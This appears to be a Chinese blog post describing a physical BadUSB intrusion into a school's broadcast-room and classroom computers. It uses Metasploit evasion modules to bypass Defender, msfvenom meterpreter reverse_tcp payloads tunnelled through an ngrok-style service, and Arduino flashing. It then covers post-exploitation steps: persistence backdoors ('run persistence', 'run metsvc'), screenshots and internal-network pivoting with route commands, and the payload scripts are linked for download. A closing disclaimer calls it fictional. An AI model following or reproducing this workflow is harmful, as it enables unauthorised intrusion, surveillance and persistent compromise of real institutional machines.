原创 Scan 合天智汇

本文所用到的工具：

  * Badusb  

  * Ngrok  

  * Arduino  

  * Msfconsole  

  * Msfvenom  

  * 迷你相机  

## 0x01蓄谋已久的前言  

每次上楼时，都能看见广播室门开得非常宽

![v2-7f860bd516009b82cf80ab2756833886_hd.j](https://pic2.zhimg.com/80/v2-7f860bd516009b82cf80ab2756833886_hd.jpg)

但这不是重点，重点是里面的电脑（WindowsXP），电脑桌面上是LED大屏幕的编辑软件。

![v2-09fdf142fdc9926e2fd49ccb7644990b_hd.j](https://pic3.zhimg.com/80/v2-09fdf142fdc9926e2fd49ccb7644990b_hd.jpg)

二楼有个网络管理箱并由管道内的网线传输到每个教室的多媒体（Windows10）。

![v2-7e92294b6ba8953896ce0fa4bfda27e8_hd.j](https://pic2.zhimg.com/80/v2-7e92294b6ba8953896ce0fa4bfda27e8_hd.jpg)

看看兜里的Badusb，突然就散发出了浓浓的香味，哧溜~~~。

俗话说“艺高人胆大”，但吾也要：武艺不高强，菜鸟也先飞！

![v2-00cf4acdfc771d01dbe679d2664d0461_hd.j](https://pic4.zhimg.com/80/v2-00cf4acdfc771d01dbe679d2664d0461_hd.jpg)

## 0x02分析并整理收集到的信息  

主机

系统

杀毒软件

网络状态

广播室

Windows XP

不详

不详

多媒体

Windows 10

Defender、360

正常

而且我们从二楼的网络管理箱分支网线的管道可推断出二楼所有教师的多媒体属于同一内网。我们在烧录代码的时候，就要根据不同的系统版本，网络状态，杀毒软件等因素来进行烧录。为什么说广播室的具体信息我们获取不到呢？因为“可远观，而不可亵玩焉。”

![v2-ddd9a5bb11100c79d88b08f5d49fe987_hd.j](https://pic2.zhimg.com/80/v2-ddd9a5bb11100c79d88b08f5d49fe987_hd.jpg)

## 0x03部署Payload及规避模块到Ngrok  

首先我们使用规避模块生成一个WindowsEXE文件来规避WindwosDefender程序，操作如下：

showevasuib

![v2-fc56746d2b2120f2b072c51bd71db10e_hd.j](https://pic3.zhimg.com/80/v2-fc56746d2b2120f2b072c51bd71db10e_hd.jpg)

![v2-e6f16664ab5d4067f4792fb000eb3496_hd.j](https://pic3.zhimg.com/80/v2-e6f16664ab5d4067f4792fb000eb3496_hd.jpg)

![v2-d73108bbd53f0d990a79f843d005e8e1_hd.j](https://pic2.zhimg.com/80/v2-d73108bbd53f0d990a79f843d005e8e1_hd.jpg)

接着run可以看到生成的FILENAME（文件名是随机的）

当然也可以自定义SetFILENAME 文件名即可

生成的文件保存到了

/root/.msf4/local/yZdsypg.exe

接下来我们来部署反弹环境，在这里来注册一个账户

登录后来到后台页面点击

![v2-3baed3f269608cb2a78a0624116c86bb_hd.j](https://pic3.zhimg.com/80/v2-3baed3f269608cb2a78a0624116c86bb_hd.jpg)

当然也有免费的隧道，不过网速较慢，根据自己的情况而定！

![v2-5fc8851b9e5d5eed3712b04dc53eaa3b_hd.j](https://pic1.zhimg.com/80/v2-5fc8851b9e5d5eed3712b04dc53eaa3b_hd.jpg)

接着我们点击立即购买，会跳转到隧道配置的页面，如图：

![v2-08990b5e12adb008d245ac56b830305c_hd.j](https://pic1.zhimg.com/80/v2-08990b5e12adb008d245ac56b830305c_hd.jpg)

使用ping服务器地址命令，找到IP地址。

![v2-af83d7d598df608e447497179f0c9c03_hd.j](https://pic4.zhimg.com/80/v2-af83d7d598df608e447497179f0c9c03_hd.jpg)

接着我们打开刚解压下来的文件夹

输入./sunnyclientid 填写你的隧道ID

![v2-aab412fe9d63b64d56550690ffdb2f68_hd.j](https://pic3.zhimg.com/80/v2-aab412fe9d63b64d56550690ffdb2f68_hd.jpg)

出现这个界面就代表隧道连接成功！

![v2-9e3f93c31940464118af4e9f95f4b35f_hd.j](https://pic2.zhimg.com/80/v2-9e3f93c31940464118af4e9f95f4b35f_hd.jpg)

接着我们用Msfvenom生成可执行文件,代码如下

![v2-935ae5fe8f2a923cfde6aee4d33b49bf_hd.p](https://pic3.zhimg.com/80/v2-935ae5fe8f2a923cfde6aee4d33b49bf_hd.png)

注：如果是64位系统，Payload则更改为：windows/x64/meterpreter/reverse_tcp对于小白很陌生带两个值是可以实现自动迁移进程的功能，关闭其中一进程并不影响另一进程。

-k选项并不适用于所有模板，请提前做好测试。

实验：MSFvenom实践

[实验:MSFvenom实践(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID9db0-7e22-486f-a628-023583616a83)

（通过该实验了解msfvenom和metasploit的用法）

![v2-758ffa361468fc8a5526e51df1057697_hd.j](https://pic1.zhimg.com/80/v2-758ffa361468fc8a5526e51df1057697_hd.jpg)

## 0x04安装Arduino  

首先我们打开arduino安装包

![v2-cbe9aae073ffa8e831fae57c3ebb2390_hd.j](https://pic4.zhimg.com/80/v2-cbe9aae073ffa8e831fae57c3ebb2390_hd.jpg)

![v2-007f0753ef1d1f75e4d9137024e6235a_hd.j](https://pic4.zhimg.com/80/v2-007f0753ef1d1f75e4d9137024e6235a_hd.jpg)

![v2-765c210185882184d46d0b81d101d0e1_hd.j](https://pic2.zhimg.com/80/v2-765c210185882184d46d0b81d101d0e1_hd.jpg)

![v2-1d26debf3e99b26c5508285c750dbb01_hd.j](https://pic3.zhimg.com/80/v2-1d26debf3e99b26c5508285c750dbb01_hd.jpg)

![v2-51fa4e4ff494f33bada0148f8f22c5c9_hd.j](https://pic4.zhimg.com/80/v2-51fa4e4ff494f33bada0148f8f22c5c9_hd.jpg)

完成了安装。

配置如下：

![v2-ec3005da0d8fa5fbec334fd01c912b04_hd.j](https://pic3.zhimg.com/80/v2-ec3005da0d8fa5fbec334fd01c912b04_hd.jpg)

完成安装。

![v2-5e76a418f8d1675b1f1714288d9727c4_hd.j](https://pic1.zhimg.com/80/v2-5e76a418f8d1675b1f1714288d9727c4_hd.jpg)

## 0x05烧录代码  

![v2-02d10c218422e7d1e3a98ed55b519cb5_hd.p](https://pic4.zhimg.com/80/v2-02d10c218422e7d1e3a98ed55b519cb5_hd.png)

![v2-a8af0aa033d52717f461ffabbeb6de31_hd.j](https://pic3.zhimg.com/80/v2-a8af0aa033d52717f461ffabbeb6de31_hd.jpg)

更多代码在文章底部有相关信息，不要着急！

编译好之后我们直接上传即可完成烧录，直接点击上传可以检查编译并上传。

## 0x06Shell快到碗里来  

![v2-ae833b004f8cd2bc8c37f0ff616e081c_hd.j](https://pic2.zhimg.com/80/v2-ae833b004f8cd2bc8c37f0ff616e081c_hd.jpg)

让基友给我代插烧鹅：

![v2-ade1055136744923f3ad91a399e6bcfd_hd.j](https://pic3.zhimg.com/80/v2-ade1055136744923f3ad91a399e6bcfd_hd.jpg)

如图：

![v2-c0280414ef2b98a64103d2ea2c10a778_hd.j](https://pic1.zhimg.com/80/v2-c0280414ef2b98a64103d2ea2c10a778_hd.jpg)

我们已经获取到了Meterpreter会话，现在我们可以为所欲为了！

为了防止亡羊补牢，要一劳永逸，我们先添加一个持久后门，命令如下：

runpersistence -X -i 5 -p 端口-rIP

or

runmetsvc

第二种方法直接监听即可，具体方法找谷哥和度娘。

![v2-8357a1ed00ef212afbe1abd9c5d1e8aa_hd.j](https://pic1.zhimg.com/80/v2-8357a1ed00ef212afbe1abd9c5d1e8aa_hd.jpg)

附带一张屏幕截图：

screenshot

![v2-770138aa3436be57d3e3c8da80c7ff56_hd.j](https://pic1.zhimg.com/80/v2-770138aa3436be57d3e3c8da80c7ff56_hd.jpg)

打开偷窥一下：

![v2-27a38c7e522cf94f4b5436de0e592382_hd.j](https://pic3.zhimg.com/80/v2-27a38c7e522cf94f4b5436de0e592382_hd.jpg)

实验：Metasploit制作木马后门

[实验:Metasploit制作木马后门(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID1932-04d9-4856-88c7-e02fb889edd3)

（通过实验来亲手使用meterpreter留nc后门）

## 0x07内网漫游  

![v2-746e79d19dcbbee7795627049cce0003_hd.j](https://pic3.zhimg.com/80/v2-746e79d19dcbbee7795627049cce0003_hd.jpg)

查看子网：runget_local_subnets

添加路由：routeadd 子网掩码 会话id

查看路由：routeprint

自动化添加路由：loadauto_add_route

![v2-cac6a7d73315dfeadd928a59babc9837_hd.j](https://pic4.zhimg.com/80/v2-cac6a7d73315dfeadd928a59babc9837_hd.jpg)

额.......好吧得退出meterpreter会话，因不可描述因素，就这样吧。

提示得运行一个Post模块，并且添加参数，大家明白就好。

设置完毕后接下来就看自己的操作了，

广播室也被搞定，也是因不可描述规章制度等原因不再继续。正文到此结束。

## 总结：  

1.要提前知晓操作系统。

2.根据不同的系统要构造不同的Payload。

3.采用多种可执行后缀（bat、exe、docx）。

4.获取Shell要第一时间添加后门。

5.不推荐使用Ngrok，自行百度其他平台，但使用方法基本一致。

6.添加完路由如果有网络异常状态，则删除路由条目。

## 代码以烧录器整理**如下：  

(均来自互联网、适用与否请提前在虚拟机测试)

打开烧录脚本软件，点击文件--打开即可。

链接：https://pan.baidu.com/s/17UCyKosBkjCRb7IBfxfdPg

提取码：btmz

声明：本文仅供参考，内容仅为虚构，代码以及使用方法切勿使用于非法用途！

  

